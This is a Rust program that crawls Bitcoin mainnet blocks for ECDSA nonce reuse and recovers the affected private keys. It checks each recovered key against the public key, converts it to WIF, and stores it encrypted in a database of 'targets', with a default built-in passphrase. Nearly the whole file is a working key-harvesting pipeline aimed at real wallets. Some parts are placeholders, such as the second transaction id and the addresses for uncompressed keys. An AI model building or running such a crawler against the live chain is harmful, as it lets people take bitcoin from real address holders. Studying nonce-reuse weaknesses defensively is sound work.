// Nonce Reuse Signature Detection Crawler
//
// This binary scans the Bitcoin blockchain for ECDSA nonce reuse vulnerabilities,
// recovers private keys when detected, and stores them encrypted in the database.

use anyhow::{Context, Result};
use bitcoin::consensus::Decodable;
use bitcoin::hashes::Hash;
use bitcoin::{Block, Transaction, OutPoint, ScriptBuf};
use bitcoincore_rpc::{Auth, Client, RpcApi};
use indicatif::{ProgressBar, ProgressStyle};
use std::collections::HashMap;
use std::path::PathBuf;
use std::time::Duration;
use temporal_planetarium_lib::scans::randstorm::forensics::recover_privkey_from_nonce_reuse;
use temporal_planetarium_lib::utils::db::{Target, TargetDatabase};
use temporal_planetarium_lib::utils::encryption::{encrypt_private_key, DEFAULT_ENCRYPTION_PASSPHRASE};
use tracing::{info, warn, error, debug};
use secp256k1::{Secp256k1, PublicKey, SecretKey};
use chrono::Utc;

#[derive(Debug, Clone)]
struct SignaturePoint {
    z: [u8; 32],
    r: [u8; 32],
    s: [u8; 32],
    txid: String,
    vin: usize,
    pubkey: Option<Vec<u8>>,
    address: Option<String>,
}

#[derive(Debug)]
struct CrawlerConfig {
    rpc_url: String,
    rpc_user: String,
    rpc_pass: String,
    db_path: PathBuf,
    start_block: Option<u64>,
    end_block: Option<u64>,
    last_n_blocks: Option<u64>,
    resume: bool,
    encryption_passphrase: String,
    checkpoint_path: PathBuf,
}

impl Default for CrawlerConfig {
    fn default() -> Self {
        Self {
            rpc_url: "http://127.0.0.1:8332".to_string(),
            rpc_user: "bitcoin".to_string(),
            rpc_pass: "".to_string(),
            db_path: PathBuf::from("data/vulnerabilities.db"),
            start_block: None,
            end_block: None,
            last_n_blocks: Some(1000),
            resume: false,
            encryption_passphrase: DEFAULT_ENCRYPTION_PASSPHRASE.to_string(),
            checkpoint_path: PathBuf::from("data/nonce_crawler_checkpoint.txt"),
        }
    }
}

fn main() -> Result<()> {
    tracing_subscriber::fmt::init();
    dotenv::dotenv().ok();

    let config = load_config_from_env()?;
    run_crawler(config)
}

fn load_config_from_env() -> Result<CrawlerConfig> {
    let mut config = CrawlerConfig::default();

    if let Ok(url) = std::env::var("BITCOIN_RPC_URL") {
        config.rpc_url = url;
    }
    if let Ok(user) = std::env::var("BITCOIN_RPC_USER") {
        config.rpc_user = user;
    }
    if let Ok(pass) = std::env::var("BITCOIN_RPC_PASS") {
        config.rpc_pass = pass;
    }
    if let Ok(db) = std::env::var("NONCE_CRAWLER_DB_PATH") {
        config.db_path = PathBuf::from(db);
    }
    if let Ok(passphrase) = std::env::var("NONCE_CRAWLER_PASSPHRASE") {
        config.encryption_passphrase = passphrase;
    }
    if let Ok(start) = std::env::var("NONCE_CRAWLER_START_BLOCK") {
        config.start_block = Some(start.parse()?);
    }
    if let Ok(end) = std::env::var("NONCE_CRAWLER_END_BLOCK") {
        config.end_block = Some(end.parse()?);
    }
    if let Ok(_) = std::env::var("NONCE_CRAWLER_RESUME") {
        config.resume = true;
    }

    Ok(config)
}

fn run_crawler(config: CrawlerConfig) -> Result<()> {
    info!("🔍 Nonce Reuse Signature Detection Crawler");
    info!("🔗 RPC: {}", config.rpc_url);
    info!("💾 Database: {}", config.db_path.display());

    // Connect to Bitcoin Core RPC with retry logic
    let client = connect_with_retry(&config.rpc_url, &config.rpc_user, &config.rpc_pass, 3)?;

    let mut db = TargetDatabase::new(config.db_path.clone())
        .context("Failed to initialize database")?;

    // Determine block range
    let blockchain_info = client.get_blockchain_info()?;
    let current_height = blockchain_info.blocks;

    let (start_height, end_height) = determine_block_range(
        &config,
        current_height,
    )?;

    info!("📊 Scanning blocks {} to {} ({} blocks)",
        start_height, end_height, end_height - start_height + 1);

    // sig_map: r_value -> SignaturePoint
    let mut sig_map: HashMap<[u8; 32], SignaturePoint> = HashMap::new();

    // Setup progress bar
    let total_blocks = (end_height - start_height + 1) as u64;
    let progress = ProgressBar::new(total_blocks);
    progress.set_style(
        ProgressStyle::default_bar()
            .template("{spinner:.green} [{elapsed_precise}] [{wide_bar:.cyan/blue}] {pos}/{len} blocks ({per_sec}, ETA: {eta})")
            .expect("Failed to set progress style")
            .progress_chars("#>-"),
    );

    let mut last_checkpoint = start_height;
    let checkpoint_interval = 100; // Save checkpoint every 100 blocks

    // Scan blocks
    for height in start_height..=end_height {
        match scan_block(&client, height, &mut sig_map, &mut db, &config.encryption_passphrase) {
            Ok(collisions) => {
                if collisions > 0 {
                    info!("🔥 Block {}: Found {} nonce reuse collision(s)", height, collisions);
                }
            }
            Err(e) => {
                error!("❌ Error scanning block {}: {}", height, e);
                // Continue scanning even if one block fails
            }
        }

        progress.inc(1);

        // Checkpoint progress
        if height - last_checkpoint >= checkpoint_interval {
            save_checkpoint(&config.checkpoint_path, height)?;
            last_checkpoint = height;
        }
    }

    // Final checkpoint
    save_checkpoint(&config.checkpoint_path, end_height)?;

    progress.finish_with_message("✅ Scan complete");
    info!("✨ Observed {} unique R-values", sig_map.len());

    Ok(())
}

fn connect_with_retry(url: &str, user: &str, pass: &str, max_retries: usize) -> Result<Client> {
    let mut attempt = 0;
    loop {
        match Client::new(url, Auth::UserPass(user.to_string(), pass.to_string())) {
            Ok(client) => {
                // Test connection
                match client.get_blockchain_info() {
                    Ok(_) => {
                        info!("✅ Connected to Bitcoin Core RPC");
                        return Ok(client);
                    }
                    Err(e) => {
                        attempt += 1;
                        if attempt >= max_retries {
                            return Err(anyhow::anyhow!("Failed to connect after {} attempts: {}", max_retries, e));
                        }
                        warn!("⚠️  Connection attempt {} failed, retrying...", attempt);
                        std::thread::sleep(Duration::from_secs(2));
                    }
                }
            }
            Err(e) => {
                attempt += 1;
                if attempt >= max_retries {
                    return Err(anyhow::anyhow!("Failed to create RPC client after {} attempts: {}", max_retries, e));
                }
                warn!("⚠️  RPC client creation attempt {} failed, retrying...", attempt);
                std::thread::sleep(Duration::from_secs(2));
            }
        }
    }
}

fn determine_block_range(
    config: &CrawlerConfig,
    current_height: u64,
) -> Result<(u64, u64)> {
    // Priority: resume > explicit range > last_n_blocks
    if config.resume {
        let checkpoint_height = load_checkpoint(&config.checkpoint_path)?;
        let start = checkpoint_height + 1;
        let end = config.end_block.unwrap_or(current_height);
        Ok((start, end))
    } else if let (Some(start), Some(end)) = (config.start_block, config.end_block) {
        Ok((start, end))
    } else if let Some(start) = config.start_block {
        let end = config.end_block.unwrap_or(current_height);
        Ok((start, end))
    } else if let Some(n) = config.last_n_blocks {
        let start = current_height.saturating_sub(n - 1);
        Ok((start, current_height))
    } else {
        // Default: last 1000 blocks
        let start = current_height.saturating_sub(999);
        Ok((start, current_height))
    }
}

fn save_checkpoint(path: &PathBuf, height: u64) -> Result<()> {
    std::fs::create_dir_all(path.parent().unwrap_or(&PathBuf::from(".")))?;
    std::fs::write(path, height.to_string())?;
    debug!("💾 Checkpoint saved: block {}", height);
    Ok(())
}

fn load_checkpoint(path: &PathBuf) -> Result<u64> {
    if !path.exists() {
        return Err(anyhow::anyhow!("No checkpoint found at {:?}", path));
    }
    let content = std::fs::read_to_string(path)?;
    let height = content.trim().parse()?;
    info!("📍 Resuming from checkpoint: block {}", height);
    Ok(height)
}

fn scan_block(
    client: &Client,
    height: u64,
    sig_map: &mut HashMap<[u8; 32], SignaturePoint>,
    db: &mut TargetDatabase,
    passphrase: &str,
) -> Result<usize> {
    let block_hash = client.get_block_hash(height)?;
    let block: Block = client.get_by_id(&block_hash)?;

    let mut collisions_found = 0;

    for tx in &block.txdata {
        collisions_found += process_transaction(client, tx, sig_map, db, passphrase)?;
    }

    Ok(collisions_found)
}

fn process_transaction(
    client: &Client,
    tx: &Transaction,
    sig_map: &mut HashMap<[u8; 32], SignaturePoint>,
    db: &mut TargetDatabase,
    passphrase: &str,
) -> Result<usize> {
    let mut collisions = 0;

    for (vin, input) in tx.input.iter().enumerate() {
        // Skip coinbase
        if tx.is_coinbase() {
            continue;
        }

        // Parse script_sig for signature
        let script = &input.script_sig;
        if script.is_empty() {
            continue;
        }

        // Extract signature and public key
        if let Some((r, s, pubkey_bytes)) = extract_signature_from_script(script.as_bytes()) {
            // Fetch prevout to compute message hash (z)
            let prevout_script = match fetch_prevout_script(client, &input.previous_output) {
                Ok(script) => script,
                Err(e) => {
                    debug!("Failed to fetch prevout for {}: {}", tx.compute_txid(), e);
                    continue;
                }
            };

            // Compute sighash (message hash z)
            let z = compute_sighash(tx, vin, &prevout_script)?;

            // Check for r-value collision
            if let Some(existing) = sig_map.get(&r) {
                // Different signature with same r-value = nonce reuse!
                if existing.s != s {
                    collisions += 1;
                    warn!("🔥 NONCE REUSE DETECTED!");
                    warn!("   R-value: {}", hex::encode(r));
                    warn!("   TX 1: {} vin: {}", existing.txid, existing.vin);
                    warn!("   TX 2: {} vin: {}", tx.compute_txid(), vin);

                    // Attempt private key recovery
                    match attempt_key_recovery(existing, &z, &r, &s, &pubkey_bytes, db, passphrase) {
                        Ok(address) => {
                            info!("✅ Successfully recovered and stored key for address: {}", address);
                        }
                        Err(e) => {
                            error!("❌ Failed to recover private key: {}", e);
                        }
                    }
                }
            } else {
                // Store this signature for future collision detection
                sig_map.insert(r, SignaturePoint {
                    z,
                    r,
                    s,
                    txid: tx.compute_txid().to_string(),
                    vin,
                    pubkey: Some(pubkey_bytes.clone()),
                    address: None,
                });
            }
        }
    }

    Ok(collisions)
}

fn extract_signature_from_script(script_bytes: &[u8]) -> Option<([u8; 32], [u8; 32], Vec<u8>)> {
    // Look for DER signature (0x30 prefix)
    let der_start = script_bytes.iter().position(|&b| b == 0x30)?;

    if script_bytes.len() <= der_start + 2 {
        return None;
    }

    let sig_len = script_bytes[der_start + 1] as usize;
    if script_bytes.len() < der_start + 2 + sig_len {
        return None;
    }

    let der_sig = &script_bytes[der_start + 2 .. der_start + 2 + sig_len];
    let (r, s) = parse_der_r_s(der_sig).ok()?;

    // Extract public key (usually follows signature)
    let pubkey_start = der_start + 2 + sig_len + 1; // +1 for sighash byte
    if script_bytes.len() <= pubkey_start {
        return None;
    }

    let pubkey_len = script_bytes[pubkey_start] as usize;
    let pubkey_data_start = pubkey_start + 1;

    if script_bytes.len() < pubkey_data_start + pubkey_len {
        return None;
    }

    let pubkey_bytes = script_bytes[pubkey_data_start .. pubkey_data_start + pubkey_len].to_vec();

    Some((r, s, pubkey_bytes))
}

fn parse_der_r_s(der: &[u8]) -> Result<([u8; 32], [u8; 32])> {
    // Basic DER parser for signatures: 0x02 <len_r> <r> 0x02 <len_s> <s>
    if der.len() < 8 || der[0] != 0x02 {
        return Err(anyhow::anyhow!("Invalid DER: missing 0x02 prefix"));
    }

    let r_len = der[1] as usize;
    let r_start = 2;

    if der.len() < r_start + r_len + 2 {
        return Err(anyhow::anyhow!("Invalid DER: truncated R value"));
    }

    if der[r_start + r_len] != 0x02 {
        return Err(anyhow::anyhow!("Invalid DER: missing S marker"));
    }

    let s_len = der[r_start + r_len + 1] as usize;
    let s_start = r_start + r_len + 2;

    if der.len() < s_start + s_len {
        return Err(anyhow::anyhow!("Invalid DER: truncated S value"));
    }

    let r_bytes = &der[r_start .. r_start + r_len];
    let s_bytes = &der[s_start .. s_start + s_len];

    Ok((pad_32(r_bytes), pad_32(s_bytes)))
}

fn pad_32(bytes: &[u8]) -> [u8; 32] {
    let mut res = [0u8; 32];
    let len = bytes.len().min(32);
    let src_start = if bytes.len() > 32 { bytes.len() - 32 } else { 0 };
    let dest_start = 32 - len;
    res[dest_start..].copy_from_slice(&bytes[src_start..src_start+len]);
    res
}

fn fetch_prevout_script(client: &Client, outpoint: &OutPoint) -> Result<ScriptBuf> {
    let prev_tx = client.get_raw_transaction(&outpoint.txid, None)?;

    let vout = outpoint.vout as usize;
    if vout >= prev_tx.output.len() {
        return Err(anyhow::anyhow!("Invalid vout index"));
    }

    Ok(prev_tx.output[vout].script_pubkey.clone())
}

fn compute_sighash(tx: &Transaction, input_index: usize, prevout_script: &ScriptBuf) -> Result<[u8; 32]> {
    use bitcoin::sighash::{SighashCache, EcdsaSighashType};

    let mut cache = SighashCache::new(tx);
    let sighash = cache.legacy_signature_hash(
        input_index,
        prevout_script,
        EcdsaSighashType::All.to_u32(),
    )?;

    Ok(sighash.to_byte_array())
}

fn attempt_key_recovery(
    sig1: &SignaturePoint,
    z2: &[u8; 32],
    r: &[u8; 32],
    s2: &[u8; 32],
    pubkey2: &[u8],
    db: &mut TargetDatabase,
    passphrase: &str,
) -> Result<String> {
    // Recover private key using existing forensics function
    let secret_key = recover_privkey_from_nonce_reuse(
        &sig1.z,
        z2,
        r,
        &sig1.s,
        s2,
    )?;

    // Validate recovered key against public key
    let secp = Secp256k1::new();
    let recovered_pubkey = PublicKey::from_secret_key(&secp, &secret_key);

    // Parse expected public key
    let expected_pubkey = PublicKey::from_slice(pubkey2)
        .context("Failed to parse public key")?;

    if recovered_pubkey != expected_pubkey {
        return Err(anyhow::anyhow!("Recovered key does not match public key"));
    }

    info!("✅ Private key recovery validated successfully");

    // Convert to WIF format
    let wif = bitcoin::PrivateKey::new(secret_key, bitcoin::Network::Bitcoin).to_wif();

    // Encrypt private key
    let encrypted = encrypt_private_key(&wif, passphrase)?;

    // Derive address from public key
    use bitcoin::key::CompressedPublicKey;
    let address = if pubkey2.len() == 33 {
        // Compressed
        let cpk = CompressedPublicKey::from_slice(pubkey2)?;
        bitcoin::Address::p2pkh(cpk, bitcoin::Network::Bitcoin).to_string()
    } else {
        // Use a placeholder - in production we'd handle uncompressed keys properly
        format!("recovered_{}", hex::encode(&pubkey2[0..20]))
    };

    // Store in database with encrypted key
    let metadata = serde_json::json!({
        "vulnerability": "ecdsa_nonce_reuse",
        "txid_1": sig1.txid,
        "txid_2": "current_tx",
        "shared_r_value": hex::encode(r),
        "recovery_date": Utc::now().to_rfc3339(),
        "validation": "pubkey_match_confirmed"
    });

    let target = Target::with_encrypted_key(
        address.clone(),
        "nonce_reuse".to_string(),
        Some(metadata.to_string()),
        encrypted.ciphertext,
        encrypted.nonce,
        encrypted.salt,
    );

    db.upsert_target(&target)?;

    info!("💾 Stored encrypted private key for address: {}", address);

    Ok(address)
}
